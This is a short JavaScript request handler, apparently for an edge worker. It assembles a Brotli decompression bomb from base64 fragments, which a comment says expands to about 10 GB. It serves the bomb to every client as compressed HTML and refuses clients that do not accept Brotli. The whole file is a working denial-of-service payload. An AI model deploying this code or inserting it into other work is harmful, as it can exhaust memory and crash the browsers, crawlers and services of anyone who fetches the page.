const brotliBombBase64Parts = {
    Header: "z///f/gnAOKxQCD3/p/////wTwDEYQGA7v0/////4Z8AiMMiAN37f/7//8M/ARCHBQC69//8//",
    Seq128MB:
        "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/z///f/gnAOKwAED3/p/////wTwDEYQGA7v0/////4Z8AiMMCAN37f/7//8M/ARCHBQC69//8//",
    Footer: "+HfwIgDgsAdO//+f//D/8EQBwWAOje//P//x/+CYA4LADQvf/n//8//BMAcVgAoHv/Pw==",
};

function makeBrotliBombBase64(count) {
    // 79*Seq128MB = 10GB
    var out = "";
    out += brotliBombBase64Parts.Header;
    for (var i = 0; i < count; i++) {
        out += brotliBombBase64Parts.Seq128MB;
    }
    out += brotliBombBase64Parts.Footer;
    return out;
}

function base64ToArrayBuffer(base64) {
    const binaryStr = atob(base64);
    const len = binaryStr.length;
    const buffer = new ArrayBuffer(len);
    const view = new Uint8Array(buffer);

    for (let i = 0; i < len; i++) {
        view[i] = binaryStr.charCodeAt(i);
    }
    return buffer;
}

const brotliBomb = base64ToArrayBuffer(makeBrotliBombBase64(79));

export default async function handleRequest(request) {
    // Get Accept-Encoding from request header
    const acceptEncoding = request.headers.get("Accept-Encoding");

    if (
        acceptEncoding &&
        !acceptEncoding.includes("br") &&
        !acceptEncoding.includes("*")
    ) {
        return new Response("Require Accept-Encoding: br", { status: 406 });
    }
    return new Response(brotliBomb, {
        encodeBody: "manual",
        headers: {
            "Content-Encoding": "br",
            "Content-Length": brotliBomb.byteLength.toString(),
            "Content-Type": "text/html",
            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
        },
    });
}
